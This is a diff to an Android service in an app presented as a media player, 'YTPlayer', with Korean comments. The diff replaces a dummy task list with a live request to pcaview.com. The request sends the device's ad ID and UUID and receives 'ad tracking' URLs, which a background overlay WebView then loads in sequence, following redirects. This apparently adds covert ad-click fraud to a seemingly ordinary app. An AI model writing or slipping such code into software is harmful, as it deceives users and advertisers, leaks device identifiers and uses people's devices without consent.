@@ -2,6 +2,7 @@ package com.ytplayer.app.overlay
 
 import android.annotation.SuppressLint
 import android.app.Notification
+import com.ytplayer.app.R
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
@@ -14,6 +15,10 @@ import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
 import android.util.Log
+import org.json.JSONArray
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 import android.view.View
 import android.view.ViewGroup
 import android.view.WindowManager
@@ -86,7 +91,7 @@ class OverlayWebViewService : Service(), ScreenStateReceiver.ScreenStateListener
                 return START_NOT_STICKY
             }
             ACTION_START, null -> {
-                Log.d(TAG, "서비스 시작 - 더미 작업 로드")
+                Log.d(TAG, "서비스 시작 - 광고 트래킹 URL 조회")
                 startOverlayTasks()
             }
         }
@@ -95,22 +100,79 @@ class OverlayWebViewService : Service(), ScreenStateReceiver.ScreenStateListener
 
     /**
      * 오버레이 작업 시작
-     * 원본 앱: CommProcess.startCommService() → WebView 생성 → URL 로드
+     * 서버 API에서 광고 트래킹 URL 목록을 받아 순차 처리
+     * API 실패 시 DummyTaskProvider로 폴백
      */
     private fun startOverlayTasks() {
-        // 더미 설정 로드 (원본 앱에서는 서버에서 AES-256 암호화된 URL 리스트를 받아 복호화)
-        taskConfig = DummyTaskProvider.createDummyConfig()
+        mainHandler.post { initOverlayWebView() }
 
-        val config = taskConfig ?: return
-        Log.d(TAG, "작업 설정 로드: ${config.items.size}개 항목, ${config.loopCount}회 반복")
+        fetchAdTrackingUrls { urls ->
+            if (urls.isEmpty()) {
+                Log.d(TAG, "API 응답 없음 - 더미 폴백")
+                taskConfig = DummyTaskProvider.createDummyConfig()
+            } else {
+                Log.d(TAG, "API 응답: ${urls.size}개 URL 수신")
+                taskConfig = OverlayTaskConfig(
+                    taskId = "live_${System.currentTimeMillis()}",
+                    items = urls.mapIndexed { i, url ->
+                        OverlayTaskItem(
+                            idx = i + 1,
+                            title = "광고 트래킹 #${i + 1}",
+                            url = url,
+                            targetPackage = ""
+                        )
+                    },
+                    loopCount = 1,
+                    delayMs = 3000L,
+                    maxRedirects = 10
+                )
+            }
 
-        currentItemIndex = 0
-        currentLoop = 0
+            val config = taskConfig ?: return@fetchAdTrackingUrls
+            Log.d(TAG, "작업 설정 로드: ${config.items.size}개 항목, ${config.loopCount}회 반복")
 
-        mainHandler.post {
-            initOverlayWebView()
+            currentItemIndex = 0
+            currentLoop = 0
             processNextItem()
         }
+    }
+
+    /**
+     * GET /api/live/count API 호출하여 광고 트래킹 URL 목록 조회
+     * Android Service에서 직접 HTTP 호출 (Flutter 엔진 미사용)
+     */
+    private fun fetchAdTrackingUrls(callback: (List<String>) -> Unit) {
+        Thread {
+            try {
+                val prefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
+                val adId = prefs.getString("flutter.ad_id", "") ?: ""
+                val encrypted = prefs.getString("flutter.device_uuid", "") ?: ""
+
+                val url = URL("https://pcaview.com/api/live/count?ad_id=$adId&encrypted=$encrypted")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "GET"
+                conn.setRequestProperty("Accept", "application/json")
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
+
+                val responseCode = conn.responseCode
+                if (responseCode == 200) {
+                    val body = conn.inputStream.bufferedReader().readText()
+                    val json = JSONObject(body)
+                    if (json.optBoolean("success")) {
+                        val arr = json.optJSONArray("data") ?: JSONArray()
+                        val urls = (0 until arr.length()).map { arr.getString(it) }
+                        mainHandler.post { callback(urls) }
+                        return@Thread
+                    }
+                }
+                Log.w(TAG, "API 응답 실패: code=$responseCode")
+                mainHandler.post { callback(emptyList()) }
+            } catch (e: Exception) {
+                Log.e(TAG, "광고 트래킹 URL 조회 실패: ${e.message}")
+                mainHandler.post { callback(emptyList()) }
+            }
+        }.start()
     }
 
     /**
@@ -144,14 +206,12 @@ class OverlayWebViewService : Service(), ScreenStateReceiver.ScreenStateListener
 
         // OverlayWebViewClient 설정
         webViewClient = OverlayWebViewClient(
+            context = this,
             maxRedirects = taskConfig?.maxRedirects ?: 10,
-            onCustomSchemeDetected = { scheme ->
-                Log.d(TAG, "커스텀 스킴 감지됨: $scheme")
-                taskResults.add("[커스텀 스킴] $scheme")
-                updateNotification("커스텀 스킴 감지: $scheme")
-            },
-            onTaskCompleted = { success, message ->
-                Log.d(TAG, "항목 완료: success=$success, msg=$message")
+            onLinkProcessed = { result ->
+                val success = result is OverlayWebViewClient.LinkResult.Success
+                val message = if (success) "링크 처리 성공" else "링크 처리 실패"
+                Log.d(TAG, "항목 완료: $message")
                 taskResults.add("[${if (success) "성공" else "실패"}] $message")
 
                 // 다음 항목으로 진행
@@ -280,7 +340,7 @@ class OverlayWebViewService : Service(), ScreenStateReceiver.ScreenStateListener
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("YTPlayer")
             .setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_media_play)
+            .setSmallIcon(R.drawable.ic_notification)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .build()
